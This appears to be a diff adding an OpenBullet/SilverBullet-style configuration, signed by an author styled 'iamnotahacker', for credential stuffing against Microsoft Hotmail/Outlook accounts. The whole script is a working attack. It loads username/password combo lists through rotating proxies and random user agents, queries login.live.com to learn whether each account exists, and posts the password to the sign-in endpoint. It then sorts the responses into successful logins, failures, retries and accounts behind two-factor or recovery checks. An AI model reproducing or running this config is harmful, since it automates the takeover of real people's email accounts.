@@ -1,0 +1,179 @@
+[SETTINGS]
+{
+  "Name": "Hotmail BY ɪᴀᴍɴᴏᴛᴀʜᴀᴄᴋᴇʀ",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2024-06-03T13:47:31.3689527+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ɪᴀᴍɴᴏᴛᴀʜᴀᴄᴋᴇʀ",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Hotmail BY ɪᴀᴍɴᴏᴛᴀʜᴀᴄᴋᴇʀ",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#guid FUNCTION GenerateGUID -> VAR "guid" 
+
+#guid2 FUNCTION GenerateGUID -> VAR "guid2" 
+
+#UA FUNCTION GetRandomUA BROWSER Chrome -> VAR "UA" 
+
+#GET REQUEST GET "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=<guid2>&redirect_uri=ms-appx-web%3a%2f%2fMicrosoft.AAD.BrokerPlugin%2f0ec893e0-5785-4de6-99da-4ed124e5296c&resource=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVform_post&windows_api_version=2.0" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "client-request-id: <GUID>" 
+  HEADER "return-client-request-id: true" 
+  HEADER "tb-aad-device-family: 3" 
+  HEADER "tb-aad-env-id: 10.0.21996.1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.21996" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#canary PARSE "<SOURCE>" LR "\",\"canary\":\"" "\"" EncodeOutput=TRUE -> VAR "canary" 
+
+#GET2 REQUEST GET "https://go.microsoft.com/fwlink/p/?linkid=2125442&clcid=0x40c&culture=EN-US&country=EN" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#opid PARSE "<SOURCE>" LR "opid=" "&bk=" -> VAR "opid" 
+
+#uaid PARSE "<SOURCE>" LR "uaid=" "\"/>" -> VAR "uaid" 
+
+#flowtoken PARSE "<SOURCE>" LR "\" value=\"" "\"" -> VAR "flowtoken" 
+
+#ftencode FUNCTION URLEncode "<flowtoken>" -> VAR "ftencode" 
+
+#contextid PARSE "<SOURCE>" LR "contextid=" "&opid=" -> VAR "contextid" 
+
+REQUEST POST "https://login.live.com/GetCredentialType.srf?opid=<opid>&id=292841&cobrandid=90015&id=292841&mkt=EN-US&lc=1033&uaid=<uaid>" 
+  CONTENT "{\"checkPhones\":false,\"country\":\"\",\"federationFlags\":3,\"flowToken\":\"<flowtoken>\",\"forceotclogin\":false,\"isCookieBannerShown\":false,\"isExternalFederationDisallowed\":false,\"isFederationDisabled\":false,\"isFidoSupported\":true,\"isOtherIdpSupported\":true,\"isRemoteConnectSupported\":false,\"isRemoteNGCSupported\":true,\"isSignup\":false,\"originalRequest\":\"\",\"otclogindisallowed\":false,\"uaid\":\"<uaid>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Content-type: application/json; charset=utf-8" 
+  HEADER "hpgid: 33" 
+  HEADER "Accept: application/json" 
+  HEADER "hpgact: 0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1717349853&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d1a09bce1-effb-eb84-729b-9d218c19e3e2&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 705" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "IfExistsResult\":1" 
+    KEY "<SOURCE>" DoesNotContain "\"data\":\"" 
+    KEY "That Microsoft account doesn't exist." 
+  KEYCHAIN Success OR 
+    KEY "IfExistsResult\":0" 
+    KEY "\"data\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" NotEqualTo "200" 
+
+REQUEST POST "https://login.live.com/ppsecure/post.srf?cobrandid=90015&id=292841&contextid=<contextid>&opid=<opid>&bk=1717349854&uaid=<uaid>&pid=0" 
+  CONTENT "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<ftencode>&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=<US>&loginfmt=<US>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1717349853&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d1a09bce1-effb-eb84-729b-9d218c19e3e2&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 645" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "sSigninName:'" 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect" 
+    KEY "You\\'ve tried to sign in too many times with an incorrect account or password." 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" NotEqualTo "200" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "action=\"https://account.live.com/recover?" 
+    KEY "action=\"https://account.live.com/Abuse?" 
+    KEY "action=\"https://account.live.com/ar/cancel?" 
+    KEY "action=\"https://account.live.com/identity/confirm?" 
+    KEY "TwoWayVoiceMobile\",\"display\":\"+X XXXXXXXX" 
+
+FUNCTION Constant "ɪᴀᴍɴᴏᴛᴀʜᴀᴄᴋᴇʀ" -> CAP "Config BY" 
+
